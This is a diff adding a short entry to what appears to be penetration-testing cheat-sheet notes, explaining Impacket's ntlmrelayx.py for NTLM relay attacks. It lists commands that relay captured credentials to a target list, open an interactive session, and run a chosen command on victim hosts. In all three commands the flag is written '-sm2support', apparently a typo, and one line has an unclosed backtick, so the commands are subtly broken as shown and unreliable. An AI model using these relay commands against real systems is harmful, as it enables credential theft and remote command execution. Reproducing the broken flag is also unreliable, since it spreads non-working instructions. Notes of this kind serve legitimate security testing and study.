@@ -250,6 +250,18 @@ after having found the the hash you can use -->  [[cheet#hashcat|hashcat]] (to d
 > if it doesn't work try without `-P`
 > if it fails try to kill apache server (`sudo /etc/init.d/apache2 stop`)
 
+#### ntlmrelayx.py
+Impacket’s ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols.
+`ntlmrelayx.py -tf targets.txt -sm2support` 
+`-tf` -->  target file
+`targets.txt` -->  contains victim IP
+
+`ntlmrelayx.py -tf targets.txt -sm2support -i`
+`-i` -->  interactive mode
+
+`ntlmrelayx.py -tf targets.txt -sm2support -c "whoami"
+`-c "command"` -->  execute a command
+
 --------
 ## Sites
 ### GTFOBins 
